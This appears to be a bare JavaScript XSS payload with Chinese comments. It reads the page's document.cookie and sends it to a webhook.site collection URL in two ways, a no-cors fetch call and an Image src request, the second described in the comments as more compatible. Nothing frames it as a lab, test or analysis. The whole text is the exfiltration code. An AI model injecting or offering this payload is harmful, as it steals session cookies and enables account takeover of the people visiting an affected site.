// 使用 fetch 将 cookie 发送到你的 Webhook
fetch("https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863" + btoa(document.cookie), {
    mode: 'no-cors'
});

// 或者使用更传统、兼容性更好的图片请求方式
new Image().src = "https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863" + document.cookie;
